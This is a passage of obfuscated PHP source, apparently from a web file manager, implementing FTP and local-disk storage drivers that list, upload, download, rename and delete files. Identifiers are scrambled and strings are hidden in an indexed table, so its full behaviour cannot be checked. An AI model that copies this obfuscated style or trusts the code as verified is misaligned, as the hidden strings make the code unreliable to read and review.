2); } $Œ­º“‰„ = KodIO::clear($Œ­º“‰„); $¦™š¼˜ = KodIO::clear($¦™š¼˜); $¦™š¼˜ = substr($¦™š¼˜, strlen($Œ­º“‰„)); if (empty($this->pathDriver)) { return $¦™š¼˜; } return $this->pathDriver . $®©²ğ™[8] . ltrim($¦™š¼˜, $®©²ğ™[8]); } private function _init($½İ‘ø = array()) { $–²¡¦°† =& $_SERVER[èùÙ¹Ïö]; if (!function_exists($–²¡¦°†[1403])) { throw new Exception(LNG($–²¡¦°†[1404])); } $this->config = $½İ‘ø; $this->charsetReset($½İ‘ø); foreach ($½İ‘ø as $äıŸ§äÀ => $ŒŒäŠè‡) { if (isset($this->{$äıŸ§äÀ})) { $this->{$äıŸ§äÀ} = $ŒŒäŠè‡; } } return $this->_login($½İ‘ø); } private function _login($ÅÕ³–Ã) { $ãîçœÃ² =& $_SERVER[èùÙ¹Ïö]; static $‘µ–¯ÔÄ = array(); $ßÊ„çµ› = md5(json_encode($ÅÕ³–Ã)); if (isset($‘µ–¯ÔÄ[$ßÊ„çµ›])) { foreach ($‘µ–¯ÔÄ[$ßÊ„çµ›] as $ëñ†ŞÇ => $ıÆ„ùî¹) { $this->{$ëñ†ŞÇ} = $ıÆ„ùî¹; } return !0; } $Úèãï• = parse_url(trim($this->server, $ãîçœÃ²[8])); $this->host = $Úèãï•[$ãîçœÃ²[198]]; $¢¿¡šĞ = isset($Úèãï•[$ãîçœÃ²[197]]) && $Úèãï•[$ãîçœÃ²[197]] == $ãîçœÃ²[1405] ? !0 : !1; $this->scheme = $¢¿¡šĞ ? $ãîçœÃ²[1406] : $ãîçœÃ²[1407]; $this->port = isset($Úèãï•[$ãîçœÃ²[199]]) ? $Úèãï•[$ãîçœÃ²[199]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ÊùæÆÍ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $è±şã¹ = $this->pasv == $ãîçœÃ²[90] ? !0 : !1; @ftp_pasv($this->connect, $è±şã¹); $‘µ–¯ÔÄ[$ßÊ„çµ›] = array($ãîçœÃ²[1408] => $this->connect, $ãîçœÃ²[198] => $this->host, $ãîçœÃ²[197] => $this->scheme, $ãîçœÃ²[199] => $this->port); return $ÊùæÆÍ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ÃÈ§¤†¶, $½¢›‰ù = '', $ùó´öÃÀ = REPEAT_RENAME) { if ($this->setContent($ÃÈ§¤†¶, $½¢›‰ù)) { return $this->getPathOuter($ÃÈ§¤†¶); } return !1; } public function mkdir($‚Óãòâ’, $¼œîù“Ä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $‚Óãòâ’ = $this->iconvSystem($‚Óãòâ’); if ($this->_isFolder($‚Óãòâ’) || @ftp_mkdir($this->connect, $‚Óãòâ’)) { return $this->getPathOuter($‚Óãòâ’); } if (!$this->mkdir($this->pathFather($‚Óãòâ’))) { return !1; } if ($‚Óãòâ’ = @ftp_mkdir($this->connect, $‚Óãòâ’)) { return $this->getPathOuter($‚Óãòâ’); } return !1; } public function copyFile($é³ÖâøÀ, $Šß ©°†) { if (!$this->_isconn()) { return !1; } $³ùö´˜İ = $this->pathThis($this->iconvSystem($é³ÖâøÀ)); $™ÀşÎ‘› = $this->tempFile($³ùö´˜İ); $™œ¨áûµ = $this->iconvApp($™ÀşÎ‘›); $this->download($é³ÖâøÀ, $™œ¨áûµ); $¯ãûÕş = $this->upload($Šß ©°†, $™œ¨áûµ); $this->tempFileRemve($™ÀşÎ‘›); return $¯ãûÕş; } public function moveFile($½ÛøÅ—œ, $áÄ‚Ò¶İ) { if (!$this->_isconn()) { return !1; } $½ÛøÅ—œ = $this->iconvSystem($½ÛøÅ—œ); $áÄ‚Ò¶İ = $this->iconvSystem($áÄ‚Ò¶İ); $•‘ØşÔ = @ftp_rename($this->connect, $½ÛøÅ—œ, $áÄ‚Ò¶İ); return $•‘ØşÔ ? $this->getPathOuter($áÄ‚Ò¶İ) : !1; } public function delFile($û¾†¦ü™) { if (!$this->_isconn()) { return !1; } $û¾†¦ü™ = $this->iconvSystem($û¾†¦ü™); return @ftp_delete($this->connect, $û¾†¦ü™); } public function delFolder($¯§›¶öˆ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $…«“óÓ = $ó°äËĞ½ = array(); $this->fileList($¯§›¶öˆ, $…«“óÓ, $ó°äËĞ½, !0); $this->listItemCache = !0; foreach ($ó°äËĞ½ as $çÓ¹§ğØ) { $È§ëüéü = $this->iconvSystem($çÓ¹§ğØ[$_SERVER[èùÙ¹Ïö][32]]); $ñáÄ¦ãå = @ftp_delete($this->connect, $È§ëüéü); if (!$ñáÄ¦ãå) { return !1; } } foreach ($…«“óÓ as $È§ëüéü) { $È§ëüéü = $this->iconvSystem($È§ëüéü); $ñáÄ¦ãå = @ftp_rmdir($this->connect, $È§ëüéü); if (!$ñáÄ¦ãå) { return !1; } } $¯§›¶öˆ = $this->iconvSystem($¯§›¶öˆ); return @ftp_rmdir($this->connect, $¯§›¶öˆ); } public function rename($Ú§Íã¦×, $÷ü§Íˆ¾) { $¨¾„í°¥ =& $_SERVER[èùÙ¹Ïö]; if (!$this->_isconn()) { return !1; } $±˜‡·åŞ = $this->fileNameAuto($this->pathFather($Ú§Íã¦×), $÷ü§Íˆ¾); $±˜‡·åŞ = $this->iconvSystem($±˜‡·åŞ); $Ú§Íã¦× = $this->iconvSystem($Ú§Íã¦×); $¡¸ïü„ = $this->pathFather($Ú§Íã¦×); $ ·§ı‘ = rtrim($¡¸ïü„, $¨¾„í°¥[8]) . $¨¾„í°¥[8] . $±˜‡·åŞ; $ã¸÷“„˜ = @ftp_rename($this->connect, $Ú§Íã¦×, $ ·§ı‘); $ ·§ı‘ = $this->iconvApp($ ·§ı‘); return $ã¸÷“„˜ ? $this->getPathOuter($ ·§ı‘) : !1; } private function folderInfo($Êî·Ñ½Û, $ÍœÜ—±ß = false) { $­˜Ê›¦É =& $_SERVER[èùÙ¹Ïö]; $©¼øİÈ­ = array($­˜Ê›¦É[32] => $this->pathThis($Êî·Ñ½Û), $­˜Ê›¦É[86] => $this->getPathOuter($­˜Ê›¦É[8] . $Êî·Ñ½Û), $­˜Ê›¦É[33] => $­˜Ê›¦É[77]); if ($ÍœÜ—±ß) { return $©¼øİÈ­; } $©¼øİÈ­[$­˜Ê›¦É[217]] = $©¼øİÈ­[$­˜Ê›¦É[87]] = 0; $©¼øİÈ­[$­˜Ê›¦É[218]] = $©¼øİÈ­[$­˜Ê›¦É[219]] = !0; return $©¼øİÈ­; } private function fileInfo($Ò˜õŒ—±, $Êî•óé“ = false, $¾¢Æ“¤ç = array()) { $ÀÇè¥Ä„ =& $_SERVER[èùÙ¹Ïö]; $¾ûÎ”İ» = array($ÀÇè¥Ä„[32] => $this->pathThis($Ò˜õŒ—±), $ÀÇè¥Ä„[86] => $this->getPathOuter($ÀÇè¥Ä„[8] . $Ò˜õŒ—±), $ÀÇè¥Ä„[33] => $ÀÇè¥Ä„[216], $ÀÇè¥Ä„[78] => isset($¾¢Æ“¤ç[$ÀÇè¥Ä„[78]]) ? $¾¢Æ“¤ç[$ÀÇè¥Ä„[78]] : 0, $ÀÇè¥Ä„[177] => $this->ext($Ò˜õŒ—±)); if ($Êî•óé“) { return $¾ûÎ”İ»; } $¾ûÎ”İ»[$ÀÇè¥Ä„[217]] = $¾ûÎ”İ»[$ÀÇè¥Ä„[87]] = 0; $¾ûÎ”İ»[$ÀÇè¥Ä„[218]] = $¾ûÎ”İ»[$ÀÇè¥Ä„[219]] = !0; $âŞ¥¿¹Î = $this->iconvSystem($Ò˜õŒ—±); $¾ûÎ”İ»[$ÀÇè¥Ä„[87]] = @ftp_mdtm($this->connect, $âŞ¥¿¹Î); if (empty($¾¢Æ“¤ç)) { $¾¢Æ“¤ç = $this->objectMeta($Ò˜õŒ—±); if (!$¾¢Æ“¤ç) { return $¾ûÎ”İ»; } } $¾ûÎ”İ»[$ÀÇè¥Ä„[78]] = $¾¢Æ“¤ç[$ÀÇè¥Ä„[78]]; return $¾ûÎ”İ»; } public function size($ß™ú€İã) { $Ø¼ù•· = $this->objectMeta($ß™ú€İã); return $Ø¼ù•· ? $Ø¼ù•·[$_SERVER[èùÙ¹Ïö][78]] : 0; } public function info($Ş«™ÂáŞ) { if ($this->isFile($Ş«™ÂáŞ)) { return $this->fileInfo($Ş«™ÂáŞ, 0); } else { if ($this->isFolder($Ş«™ÂáŞ)) { return $this->folderInfo($Ş«™ÂáŞ); } } return !1; } private function fileList($í§¼£À‘, &$€ßÖÏ½, &$’ÙÉÄı, $¤¬†–ıù = false) { $Û‰×ö…Ÿ =& $_SERVER[èùÙ¹Ïö]; $í§¼£À‘ = $this->iconvSystem($í§¼£À‘); if (!$this->isFolder($í§¼£À‘)) { return !1; } @ftp_chdir($this->connect, $Û‰×ö…Ÿ[8]); $í§¼£À‘ = rtrim($í§¼£À‘, $Û‰×ö…Ÿ[8]) . $Û‰×ö…Ÿ[8]; check_abort(); $û—«óîÎ = @ftp_rawlist($this->connect, $í§¼£À‘); if (!$û—«óîÎ) { $û—«óîÎ = array(); } $‘Éø·İÃ = array($Û‰×ö…Ÿ[10] => 1, $Û‰×ö…Ÿ[1326] => 1); foreach ($û—«óîÎ as $±ä«¡õÁ) { $³ç¦»ä÷ = $this->_listItem($±ä«¡õÁ); if ($³ç¦»ä÷[0] == $Û‰×ö…Ÿ[798]) { continue; } $é°Áä› = $³ç¦»ä÷[8]; if (empty($é°Áä›) && $é°Áä› !== $Û‰×ö…Ÿ[214] || isset($‘Éø·İÃ[$é°Áä›])) { continue; } $é°Áä› = $this->iconvApp($í§¼£À‘ . ltrim($é°Áä›, $Û‰×ö…Ÿ[8])); $ÎÉßŸ¨ç = array($Û‰×ö…Ÿ[32] => $é°Áä›, $Û‰×ö…Ÿ[33] => $Û‰×ö…Ÿ[216], $Û‰×ö…Ÿ[78] => $³ç¦»ä÷[4]); if (substr($±ä«¡õÁ, 0, 1) == $Û‰×ö…Ÿ[1409]) { $ÎÉßŸ¨ç[$Û‰×ö…Ÿ[33]] = $Û‰×ö…Ÿ[77]; $ÎÉßŸ¨ç[$Û‰×ö…Ÿ[78]] = 0; } $ÓÃÔğŠõ = $ÎÉßŸ¨ç[$Û‰×ö…Ÿ[33]] == $Û‰×ö…Ÿ[77] ? !0 : !1; $this->cacheMethodInfoSet($é°Áä›, $ÓÃÔğŠõ, $ÎÉßŸ¨ç); if ($ÓÃÔğŠõ) { $€ßÖÏ½[] = $é°Áä›; if ($¤¬†–ıù) { $this->fileList($é°Áä›, $€ßÖÏ½, $’ÙÉÄı, $¤¬†–ıù); } continue; } $’ÙÉÄı[] = $ÎÉßŸ¨ç; } $this->cacheMethodInfoSet($í§¼£À‘, !0); } private function _listItem($†ú·ÒÎ…) { if (empty($†ú·ÒÎ…)) { return array(); } $’¯î© = preg_split($_SERVER[èùÙ¹Ïö][1410], $†ú·ÒÎ…); if (count($’¯î©) <= 9) { return $’¯î©; } $’¯î©[8] = trim(substr($†ú·ÒÎ…, strpos($†ú·ÒÎ…, $’¯î©[7]) + strlen($’¯î©[7]))); return array_splice($’¯î©, 0, 9); } public function listPath($ÇÛöÜÑÆ, $›±¶¹°Å = false) { $×İò¤£ =& $_SERVER[èùÙ¹Ïö]; if (!$this->_isconn()) { return !1; } $Ø¡œò­Ş = $–®¨¶ñ = array(); $this->fileList($ÇÛöÜÑÆ, $Ø¡œò­Ş, $–®¨¶ñ); foreach ($Ø¡œò­Ş as $ª¥²µı => $Ä„¡¯°İ) { $Ø¡œò­Ş[$ª¥²µı] = $this->folderInfo($Ä„¡¯°İ, $›±¶¹°Å); } foreach ($–®¨¶ñ as $ª¥²µı => $Ä„¡¯°İ) { $–®¨¶ñ[$ª¥²µı] = $this->fileInfo($Ä„¡¯°İ[$×İò¤£[32]], $›±¶¹°Å, $Ä„¡¯°İ); } return array($×İò¤£[84] => $Ø¡œò­Ş, $×İò¤£[85] => $–®¨¶ñ); } public function has($³ü‰ÛŒ‰, $ØÅöëÔ» = false, $²¹›áŒ· = true) { $°î¶‹Íı =& $_SERVER[èùÙ¹Ïö]; $¦ßÅô·Ş = $“º‚§çÇ = array(); $›Ä ·ÇÁ = $ØÅöëÔ» ? !0 : !1; $this->fileList($³ü‰ÛŒ‰, $¦ßÅô·Ş, $“º‚§çÇ, $›Ä ·ÇÁ); if ($ØÅöëÔ») { return array($°î¶‹Íı[225] => count($“º‚§çÇ), $°î¶‹Íı[226] => count($¦ßÅô·Ş)); } if ($²¹›áŒ·) { if (count($“º‚§çÇ)) { return !0; } } else { if (count($¦ßÅô·Ş)) { return !0; } } return !1; } public function listAll($ßÂ±ó±Ì) { $¸´Ø»Ÿö =& $_SERVER[èùÙ¹Ïö]; if (!$this->_isconn()) { return !1; } $‚Œ×ä¬ = $ı‰÷Å‰¼ = array(); $this->fileList($ßÂ±ó±Ì, $‚Œ×ä¬, $ı‰÷Å‰¼, !0); $»ºŸ®“Ä = array_to_keyvalue($ı‰÷Å‰¼, $¸´Ø»Ÿö[32]); foreach ($‚Œ×ä¬ as $³¯çû‹) { if (is_string($³¯çû‹)) { $»ºŸ®“Ä[$³¯çû‹] = array($¸´Ø»Ÿö[78] => 0); } } return $this->listAllFiles($ßÂ±ó±Ì, $»ºŸ®“Ä); } public function getContent($´ïŸ´¶Û) { if (!$this->_isconn()) { return !1; } $´ïŸ´¶Û = $this->iconvSystem($´ïŸ´¶Û); return $this->fileSubstr($´ïŸ´¶Û); } public function setContent($¹–ª¤Ì», $ëÕğì = '') { if (!$this->_isconn()) { return !1; } $š–‡¿Ÿ¿ = $this->pathThis($this->iconvSystem($¹–ª¤Ì»)); $Ñ‚‰µå› = $this->tempFile($š–‡¿Ÿ¿); file_put_contents($Ñ‚‰µå›, $ëÕğì); $³¶¡ç»® = $this->upload($¹–ª¤Ì», $this->iconvApp($Ñ‚‰µå›)); $this->tempFileRemve($Ñ‚‰µå›); return $³¶¡ç»®; } public function fileSubstr($Ñºæñ, $°äÀÎº = 0, $‘ÁªÌáÓ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ñºæñ, $°äÀÎº, $‘ÁªÌáÓ); } private function ftpRequest($ÊÆíâÛ–, $°€ò„­° = 0, $÷›‘¼úœ = false) { $ÊÆíâÛ– = $this->iconvSystem($ÊÆíâÛ–); $³ÊÔÜı = $this->scheme . $this->host . $_SERVER[èùÙ¹Ïö][4] . $this->port; $ÕÎ¤†ƒô = curl_init(); curl_setopt($ÕÎ¤†ƒô, CURLOPT_URL, $³ÊÔÜı . $this->pathEncode($ÊÆíâÛ–)); curl_setopt($ÕÎ¤†ƒô, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($÷›‘¼úœ) { $ˆê±ÓÔ£ = $°€ò„­° + $÷›‘¼úœ - 1; curl_setopt($ÕÎ¤†ƒô, CURLOPT_RANGE, "{$°€ò„­°}\55{$ˆê±ÓÔ£}"); } curl_setopt($ÕÎ¤†ƒô, CURLOPT_RETURNTRANSFER, 1); $ÇÕû¹„ = curl_exec($ÕÎ¤†ƒô); curl_close($ÕÎ¤†ƒô); return $ÇÕû¹„; } public function upload($¤¯ÆÍ©, $÷³¯ïü, $Ã¤ÉšŸÎ = false, $Â—èªĞ› = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¤¯ÆÍ©))) { return !1; } $¤¯ÆÍ© = $this->iconvSystem($¤¯ÆÍ©); $÷³¯ïü = $this->iconvSystem($÷³¯ïü); $ŒŸ§ù†ù = ftp_nb_put($this->connect, $¤¯ÆÍ©, $÷³¯ïü, FTP_BINARY); while ($ŒŸ§ù†ù == FTP_MOREDATA) { $ŒŸ§ù†ù = ftp_nb_continue($this->connect); } if ($ŒŸ§ù†ù != FTP_FINISHED) { return !1; } return $this->getPathOuter($¤¯ÆÍ©); } public function download($–ÚÙıĞÆ, $ø½Èõ´ = '') { if (!$this->_isconn()) { return !1; } $…†“Ø¤ = $this->pathFather($ø½Èõ´); if (!IO::mkdir($…†“Ø¤)) { return !1; } $–ÚÙıĞÆ = $this->iconvSystem($–ÚÙıĞÆ); $ø½Èõ´ = $this->iconvSystem($ø½Èõ´); $ášÁöá– = ftp_nb_get($this->connect, $ø½Èõ´, $–ÚÙıĞÆ, FTP_BINARY); while ($ášÁöá– == FTP_MOREDATA) { $ášÁöá– = ftp_nb_continue($this->connect); } if ($ášÁöá– != FTP_FINISHED) { return !1; } return $this->iconvApp($ø½Èõ´); } public function exist($±½°ä¶¹) { return $this->isFile($±½°ä¶¹) || $this->isFolder($±½°ä¶¹); } public function isFile($¥ø¬ö´’) { return !$this->isFolder($¥ø¬ö´’) && $this->objectMeta($¥ø¬ö´’); } public function isFolder($¤âöŸ¯Ç) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][168], $¤âöŸ¯Ç); } protected function objectMeta($©æ¼õğ¤) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][170], $©æ¼õğ¤); } protected function _objectMeta($±êí›ïš) { $ü—Óïí =& $_SERVER[èùÙ¹Ïö]; if ($±êí›ïš == $ü—Óïí[12] || $±êí›ïš == $ü—Óïí[8]) { return array(); } if (!$this->_isconn()) { return !1; } $±êí›ïš = $this->iconvSystem($±êí›ïš); $ó¹Ÿó² = array($ü—Óïí[32] => $this->iconvApp($±êí›ïš), $ü—Óïí[33] => $ü—Óïí[216], $ü—Óïí[78] => 0); @ftp_chdir($this->connect, $ü—Óïí[8]); $÷³òâË¾ = @ftp_size($this->connect, $±êí›ïš); if ($÷³òâË¾ != -1) { $ó¹Ÿó²[$ü—Óïí[78]] = $÷³òâË¾; } else { $÷­Õœ§µ = @ftp_chdir($this->connect, $±êí›ïš); if (!$÷­Õœ§µ) { return !1; } $ó¹Ÿó²[$ü—Óïí[33]] = $ü—Óïí[77]; } return $ó¹Ÿó²; } protected function _isFolder($èÛü¨¶à) { $Ã±Ú¢×£ =& $_SERVER[èùÙ¹Ïö]; if ($èÛü¨¶à == $Ã±Ú¢×£[12] || $èÛü¨¶à == $Ã±Ú¢×£[8]) { return !0; } $ê¦¥èğ = $this->_objectMeta($èÛü¨¶à); return isset($ê¦¥èğ[$Ã±Ú¢×£[33]]) && $ê¦¥èğ[$Ã±Ú¢×£[33]] == $Ã±Ú¢×£[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($„ğ½¢÷„) { if (substr($„ğ½¢÷„, 0, 2) == $_SERVER[èùÙ¹Ïö][1402]) { $„ğ½¢÷„ = BASIC_PATH . substr($„ğ½¢÷„, 2); } return $„ğ½¢÷„; } public function iconvApp($€İ¯®€Ñ) { $ÒÆÌÇ§Õ =& $_SERVER[èùÙ¹Ïö]; global $config; return $this->iconvTo($€İ¯®€Ñ, $config[$ÒÆÌÇ§Õ[1400]], $config[$ÒÆÌÇ§Õ[1399]]); } public function iconvSystem($Ü¹ÖÁìÍ) { $ùØØ¶À =& $_SERVER[èùÙ¹Ïö]; global $config; return $this->iconvTo($Ü¹ÖÁìÍ, $config[$ùØØ¶À[1399]], $config[$ùØØ¶À[1400]]); } public function getPathOuter($¸·ììŸÌ) { $ƒ¡ıˆï‰ =& $_SERVER[èùÙ¹Ïö]; $¤¨½¬İö = $this->iconvApp($this->pathBase); $¸·ììŸÌ = $this->iconvApp($¸·ììŸÌ); if (substr($¤¨½¬İö, 0, 2) == $ƒ¡ıˆï‰[1402]) { $¤¨½¬İö = BASIC_PATH . substr($¤¨½¬İö, 2); } if (substr($¸·ììŸÌ, 0, 2) == $ƒ¡ıˆï‰[1402]) { $¸·ììŸÌ = BASIC_PATH . substr($¸·ììŸÌ, 2); } $¤¨½¬İö = KodIO::clear($¤¨½¬İö); $¸·ììŸÌ = KodIO::clear($¸·ììŸÌ); $¸·ììŸÌ = substr($¸·ììŸÌ, strlen($¤¨½¬İö)); if (empty($this->pathDriver)) { return $¸·ììŸÌ; } return $this->pathDriver . $ƒ¡ıˆï‰[8] . ltrim($¸·ììŸÌ, $ƒ¡ıˆï‰[8]); } public function mkfile($ˆ¥ãâ±, $œ·¡Ï®¶ = '', $‹ø¸ü¯¾ = REPEAT_RENAME) { $ˆ¥ãâ± = $this->iconvSystem($ˆ¥ãâ±); @touch($ˆ¥ãâ±); if ($œ·¡Ï®¶) { file_put_contents($ˆ¥ãâ±, $œ·¡Ï®¶); } @chmod($ˆ¥ãâ±, $this->pathAuth); return is_file($ˆ¥ãâ±) ? $this->getPathOuter($ˆ¥ãâ±) : !1; } public function mkdir($¸ÙË²ºÁ, $Í›ôîüÙ = REPEAT_SKIP) { $¸ÙË²ºÁ = $this->iconvSystem($¸ÙË²ºÁ); if (is_dir($¸ÙË²ºÁ)) { return $this->getPathOuter($¸ÙË²ºÁ); } @mkdir($¸ÙË²ºÁ, $this->pathAuth, !0); @chmod($¸ÙË²ºÁ, $this->pathAuth); return is_dir($¸ÙË²ºÁ) ? $this->getPathOuter($¸ÙË²ºÁ) : !1; } public function copyFile($åŸÀªÛñ, $•Ñà„¸Ø) { $this->mkdir($this->pathFather($•Ñà„¸Ø)); $åŸÀªÛñ = $this->iconvSystem($åŸÀªÛñ); $•Ñà„¸Ø = $this->iconvSystem($•Ñà„¸Ø); $ÂÎê„Ï³ = copy_64($åŸÀªÛñ, $•Ñà„¸Ø); @chmod($•Ñà„¸Ø, $this->pathAuth); return $ÂÎê„Ï³ ? $this->getPathOuter($•Ñà„¸Ø) : !1; } public function moveFile($˜«Ãé©ˆ, $‰Æ’Ó–°) { $this->mkdir($this->pathFather($‰Æ’Ó–°)); $˜«Ãé©ˆ = $this->iconvSystem($˜«Ãé©ˆ); $‰Æ’Ó–° = $this->iconvSystem($‰Æ’Ó–°); $ÀÁş§€· = intval(@rename($˜«Ãé©ˆ, $‰Æ’Ó–°)); if (!$ÀÁş§€·) { if ($ÀÁş§€· = intval(@copy_64($˜«Ãé©ˆ, $‰Æ’Ó–°))) { @unlink($˜«Ãé©ˆ); } } @chmod($‰Æ’Ó–°, $this->pathAuth); return $ÀÁş§€· ? $this->getPathOuter($‰Æ’Ó–°) : !1; } public function movePath($¯áÎ²óƒ, $¹•èÇ´, $İŸöàûŒ = false) { $¸Â“¹Ö  =& $_SERVER[èùÙ¹Ïö]; $¯áÎ²óƒ = $this->iconvSystem($¯áÎ²óƒ); $¹•èÇ´ = $this->iconvSystem($¹•èÇ´); $ÃÕşĞ = rtrim($¹•èÇ´, $¸Â“¹Ö [8]) . $¸Â“¹Ö [8] . ($İŸöàûŒ ? $İŸöàûŒ : get_path_this($¯áÎ²óƒ)); if (file_exists($ÃÕşĞ)) { return !1; } $îÚš—¿ı = intval(@rename($¯áÎ²óƒ, $ÃÕşĞ)); $îÚš—¿ı = file_exists($ÃÕşĞ); return $îÚš—¿ı ? $this->getPathOuter($ÃÕşĞ) : !1; } public function delFile($ššş»Şä) { $ššş»Şä = $this->iconvSystem($ššş»Şä); if (!@unlink($ššş»Şä)) { @chmod($ššş»Şä, $this->pathAuth); if (!@unlink($ššş»Şä)) { return !1; } } else { return !0; } } public function delFolder($Ñú‚šÆ) { $´ş¼Œ˜Õ =& $_SERVER[èùÙ¹Ïö]; $Ñú‚šÆ = $this->iconvSystem($Ñú‚šÆ); if (!is_dir($Ñú‚šÆ)) { return !0; } if (!($Îå½Å—¡ = opendir($Ñú‚šÆ))) { return !1; } while (($ïµŠƒ¬² = readdir($Îå½Å—¡)) !== !1) { if ($ïµŠƒ¬² == $´ş¼Œ˜Õ[10] || $ïµŠƒ¬² == $´ş¼Œ˜Õ[1326]) { continue; } $ùÙ¨‡Œ = $Ñú‚šÆ . $´ş¼Œ˜Õ[8] . $ïµŠƒ¬²; if (is_file($ùÙ¨‡Œ) || is_link($ùÙ¨‡Œ)) { if (!unlink($ùÙ¨‡Œ)) { chmod($ùÙ¨‡Œ, $this->pathAuth); if (!unlink($ùÙ¨‡Œ)) { return !1; } } } else { if (is_dir($ùÙ¨‡Œ)) { chmod($ùÙ¨‡Œ, $this->pathAuth); $ùÙ¨‡Œ = $this->iconvApp($ùÙ¨‡Œ); if (!$this->delFolder($ùÙ¨‡Œ)) { return !1; } } } } closedir($Îå½Å—¡); return rmdir($Ñú‚šÆ); } public function rename($Öô¥©¦‡, $è×¢¥Ó®) { $«ï–ø·ô =& $_SERVER[èùÙ¹Ïö]; $’±áÙ¸ = $this->fileNameAuto($this->pathFather($Öô¥©¦‡), $è×¢¥Ó®); $’±áÙ¸ = $this->iconvSystem($’±áÙ¸); $Öô¥©¦‡ = $this->iconvSystem($Öô¥©¦‡); $±êšÅ± = $this->pathFather($Öô¥©¦‡); $Ù¯¯¨íÏ = rtrim($±êšÅ±, $«ï–ø·ô[8]) . $«ï–ø·ô[8] . $’±áÙ¸; $…™‘Æ‘ö = @rename($Öô¥©¦‡, $Ù¯¯¨íÏ); $Ù¯¯¨íÏ = $this->iconvApp($Ù¯¯¨íÏ); return $…™‘Æ‘ö ? $this->getPathOuter($Ù¯¯¨íÏ) : !1; } public function size($Ğ¢Õ¼ß) { $Ğ¢Õ¼ß = $this->iconvSystem($Ğ¢Õ¼ß); return filesize_64($Ğ¢Õ¼ß); } public function info($¹ø²ñõ) { $¹ø²ñõ = $this->iconvSystem($¹ø²ñõ); if ($this->isFolder($¹ø²ñõ)) { return $this->folderInfo($¹ø²ñõ); } else { if ($this->isFile($¹ø²ñõ)) { return $this->fileInfo($¹ø²ñõ); } } return !1; } protected function infoChildren($©ÇÜ¬Ê‰, &$ˆ¸ï±Õ‹, $ò¿‘ÕÏç = true) { $—¡‡‚æü =& $_SERVER[èùÙ¹Ïö]; check_abort_echo(); $©ÇÜ¬Ê‰ = rtrim($©ÇÜ¬Ê‰, $—¡‡‚æü[8]) . $—¡‡‚æü[8]; if ($ò¿‘ÕÏç) { $©ÇÜ¬Ê‰ = $this->iconvSystem($©ÇÜ¬Ê‰); } if (!($ÒÈÍ’ìÁ = @opendir($©ÇÜ¬Ê‰))) { return; } while (($¦¶şÁğƒ = readdir($ÒÈÍ’ìÁ)) !== !1) { if ($¦¶şÁğƒ == $—¡‡‚æü[10] || $¦¶şÁğƒ == $—¡‡‚æü[1326]) { continue; } $Öõ¾‡„Ù = $©ÇÜ¬Ê‰ . $¦¶şÁğƒ; if (is_file($Öõ¾‡„Ù) || is_link($Öõ¾‡„Ù)) { $ˆ¸ï±Õ‹[$—¡‡‚æü[79]]++; $ˆ¸ï±Õ‹[$—¡‡‚æü[78]] += filesize_64($Öõ¾‡„Ù); } else { if (is_dir($Öõ¾‡„Ù)) { $ˆ¸ï±Õ‹[$—¡‡‚æü[80]]++; $this->infoChildren($Öõ¾‡„Ù, $ˆ¸ï±Õ‹, !1); } } } closedir($ÒÈÍ’ìÁ); } private function folderInfo($ÂÉë”ïÌ, $„ì¦å£ƒ = false) { $Ÿ²¢»Äø =& $_SERVER[èùÙ¹Ïö]; $ÂÉë”ïÌ = rtrim($ÂÉë”ïÌ, $Ÿ²¢»Äø[8]) . $Ÿ²¢»Äø[8]; $İ€Â”À = $this->iconvApp($this->pathThis($ÂÉë”ïÌ)); if ($„ì¦å£ƒ) { return array($Ÿ²¢»Äø[32] => $İ€Â”À, $Ÿ²¢»Äø[86] => $this->getPathOuter($ÂÉë”ïÌ), $Ÿ²¢»Äø[33] => $Ÿ²¢»Äø[77]); } $º‰ùŸÜö = array($Ÿ²¢»Äø[32] => $İ€Â”À, $Ÿ²¢»Äø[86] => $this->getPathOuter($ÂÉë”ïÌ), $Ÿ²¢»Äø[33] => $Ÿ²¢»Äø[77], $Ÿ²¢»Äø[217] => @filectime($ÂÉë”ïÌ), $Ÿ²¢»Äø[87] => @filemtime($ÂÉë”ïÌ), $Ÿ²¢»Äø[1411] => @fileatime($ÂÉë”ïÌ), $Ÿ²¢»Äø[1412] => is_readable($ÂÉë”ïÌ), $Ÿ²¢»Äø[1413] => is_writable($ÂÉë”ïÌ), $Ÿ²¢»Äø[1414] => get_mode($ÂÉë”ïÌ)); return $º‰ùŸÜö; } private function fileInfo($¢ÙÉ°ˆÄ, $’’¨¶‹ = false) { $É»ñï¸ê =& $_SERVER[èùÙ¹Ïö]; $”Ğ½şÑ  = $this->iconvApp($this->pathThis($¢ÙÉ°ˆÄ)); if ($’’¨¶‹) { return array($É»ñï¸ê[32] => $”Ğ½şÑ , $É»ñï¸ê[86] => $this->getPathOuter($¢ÙÉ°ˆÄ), $É»ñï¸ê[33] => $É»ñï¸ê[216], $É»ñï¸ê[78] => $this->size($¢ÙÉ°ˆÄ), $É»ñï¸ê[177] => $this->ext($”Ğ½şÑ )); } $ÁåŒ· = array($É»ñï¸ê[32] => $”Ğ½şÑ , $É»ñï¸ê[86] => $this->getPathOuter($¢ÙÉ°ˆÄ), $É»ñï¸ê[33] => $É»ñï¸ê[216], $É»ñï¸ê[217] => @filectime($¢ÙÉ°ˆÄ), $É»ñï¸ê[87] => @filemtime($¢ÙÉ°ˆÄ), $É»ñï¸ê[1411] => @fileatime($¢ÙÉ°ˆÄ), $É»ñï¸ê[78] => $this->size($¢ÙÉ°ˆÄ), $É»ñï¸ê[177] => $this->ext($”Ğ½şÑ ), $É»ñï¸ê[1412] => is_readable($¢ÙÉ°ˆÄ), $É»ñï¸ê[1413] => is_writable($¢ÙÉ°ˆÄ), $É»ñï¸ê[1414] => get_mode($¢ÙÉ°ˆÄ)); return $ÁåŒ·; } public function exist($¯Í¼üÚ) { 